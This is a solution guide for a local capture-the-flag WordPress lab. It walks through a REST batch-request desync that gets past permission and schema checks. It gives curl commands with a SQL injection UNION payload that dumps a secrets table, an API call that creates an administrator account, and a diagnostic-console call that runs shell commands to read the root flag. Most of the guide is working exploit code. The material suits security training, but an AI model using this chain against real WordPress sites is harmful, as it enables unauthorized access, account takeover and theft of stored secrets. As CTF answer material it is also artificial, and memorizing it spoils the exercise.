# Solution Guide

This guide targets only the local lab endpoint:

```text
http://127.0.0.1:8080/wp-json/wp2shell-lab/v1/batch
```

## 1. Confirm Routes

```bash
curl -s http://127.0.0.1:8080/wp-json/wp2shell-lab/v1/public/ping
```

The public ping route responds. Note that `/admin/report` is also accessible
directly (it mirrors the real WordPress `/wp/v2/posts` which is public), but
its schema validation rejects scalar `author__not_in` — it must be an array.

## 2. Understand the Batch Desync

The batch handler has two bugs mirroring CVE-2026-63030:

**Bug 1**: A malformed URL (`http://:`) causes `wp_parse_url()` to fail. The
error is pushed to `$validation[]` but no entry is added to the sequential
`$matches[]` array, desynchronizing them.

**Bug 2**: The dispatch loop reads `$matches[$i]` using the original request
index, but `$matches` is sequential and shorter. So `$matches[$i]` resolves
to the match for a DIFFERENT request — shifting the handler, permission, AND
schema validation.

The batch must contain 3 sub-requests:
- index 0: `http://:` (malformed, triggers desync)
- index 1: your target route with the attack body
- index 2: `/public/ping` (padding that populates `$matches[1]`)

Due to the shift, index 1 reads `$matches[1]` which is the ping route's match.
Both routes share the same handler function, but the ping route has no schema
validation for `author__not_in` — so the scalar payload passes through.

## 3. Trigger the Desync (Confirm It Works)

```bash
curl -s -X POST \
  http://127.0.0.1:8080/wp-json/wp2shell-lab/v1/batch \
  -H 'Content-Type: application/json' \
  -d '{
    "requests": [
      {"method": "POST", "path": "http://:"},
      {"method": "POST", "path": "/admin/report", "body": {"author__not_in": "0"}},
      {"method": "POST", "path": "/public/ping"}
    ]
  }'
```

Check the `debug` field: `desync: true` confirms the arrays are out of step.
`responses[1]` should show the query result (not a permission or validation error).

## 4. Dump the User Flag and Stage Token

Use a `UNION SELECT` with three columns (matching `ID, post_title, post_author`).

```bash
curl -s -X POST \
  http://127.0.0.1:8080/wp-json/wp2shell-lab/v1/batch \
  -H 'Content-Type: application/json' \
  -d '{
    "requests": [
      {"method": "POST", "path": "http://:"},
      {
        "method": "POST",
        "path": "/admin/report",
        "body": {
          "author__not_in": "0) UNION SELECT 1, CONCAT(secret_name, \":\", secret_value), 1 FROM wp_wp2shell_lab_secrets -- "
        }
      },
      {"method": "POST", "path": "/public/ping"}
    ]
  }'
```

Look in `responses[1].body.rows[*].post_title` for `user_flag:HackCTF{...}` and `stage2_token:...`.

## 5. Create an Administrator

Replace `TOKEN_HERE` with the recovered `stage2_token`. This uses a direct
REST call — the create-admin endpoint accepts the stage2_token for permission.

```bash
curl -s -X POST \
  http://127.0.0.1:8080/wp-json/wp2shell-lab/v1/admin/create-admin \
  -H 'Content-Type: application/json' \
  -d '{
    "token": "TOKEN_HERE",
    "username": "wp2_ctf_admin",
    "password": "Wp2shell-lab-Password-123!",
    "email": "wp2_ctf_admin@wp2shell.invalid"
  }'
```

## 6. Read the Root Flag

Use the diagnostic console with the same token:

```bash
curl -s -X POST \
  http://127.0.0.1:8080/wp-json/wp2shell-lab/v1/admin/diagnostic \
  -H 'Content-Type: application/json' \
  -d '{
    "token": "TOKEN_HERE",
    "cmd": "cat /opt/wp2shell-lab/root.txt"
  }'
```

Alternatively, log in at `/wp-login.php`, open `wp2shell Lab` in the admin menu,
review indicators, and run `cat /opt/wp2shell-lab/root.txt` from the bounded
diagnostic console.

## Automated Local Smoke Test

```bash
python3 attacker/solve.py http://127.0.0.1:8080
```
